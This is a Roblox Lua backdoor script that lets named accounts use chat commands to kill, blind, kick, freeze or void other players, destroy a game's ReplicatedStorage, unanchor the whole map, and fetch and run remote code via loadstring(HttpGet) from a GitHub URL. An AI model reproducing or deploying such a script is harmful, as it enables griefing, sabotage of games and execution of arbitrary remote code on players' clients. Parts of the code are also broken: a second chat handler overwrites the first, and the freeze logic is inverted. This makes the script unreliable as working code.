local textChatService = game:GetService("TextChatService")

local commands = {
    kill = function()
        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
        end
    end,
    void = function()
        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
            local character = game.Players.LocalPlayer.Character
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
            local newPosition = humanoidRootPart.CFrame
            for i = 1, 3 do
                newPosition = newPosition + Vector3.new(0, -20, 0)
                humanoidRootPart.CFrame = newPosition
                wait(0.01)
            end
        end
    end,
    blind = function()
        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
            local blur = Instance.new("BlurEffect", game.Lighting)
            blur.Size = 10000000000000
        end
    end,
    unblind = function()
        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
            local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
            if blur then
                blur:Destroy()
            end
        end
    end,
    trollage = function()
        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage.lua"))()
        end
    end,
    crash = function()
        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
            wait(1)
            for index, player in pairs(game.Players:GetPlayers()) do
                player:Kick("Snoopy Owns You")
            end
        end
    end,
    freeze = function()
        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")
            local function unanchorCharacter()
                if not humanoid.RootPart.Anchored then
                    return
                end
                humanoid.RootPart.Anchored = true
            end
            unanchorCharacter()
        end
    end,
    unfreeze = function()
        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")
            local function unanchorCharacter()
                if not humanoid.RootPart.Anchored then
                    return
                end
                humanoid.RootPart.Anchored = false
            end
            unanchorCharacter()
        end
    end,
    breakgame = function()
        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
            pcall(function()
                local replicatedStorage = game:GetService("ReplicatedStorage")
                for _, child in ipairs(replicatedStorage:GetDescendants()) do
                    child:Destroy()
                end
            end)
        end
    end,
    funnymap = function()
        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
            local function unanchorParts(object)
                if object:IsA("BasePart") then
                    object.Anchored = false
                end
                for _, child in ipairs(object:GetChildren()) do
                    unanchorParts(child)
                end
            end
            unanchorParts(workspace)
        end
    end,
}

textChatService.OnIncomingMessage = function(message)
    local properties = Instance.new("TextChatMessageProperties")
    if message.TextSource then
        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
        if player.Name == "SnoopyIs_Better" or player.Name == "menamge0" then
            local command = commands[message.Text]
            if command then
                command()
            end
        end
    end
    return properties
end

textChatService.OnIncomingMessage = function(message)
    local properties = Instance.new("TextChatMessageProperties")
    if message.TextSource then
        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
        if player.Name == "SnoopyIs_Pro" or player.Name == "menamge0" or player.Name == "SnoopyIs_Better" then
            properties.PrefixText = "<font color='#c800c8'>[SP+ PRIVATE]</font> " .. message.PrefixText
        end
    end
    return properties
end
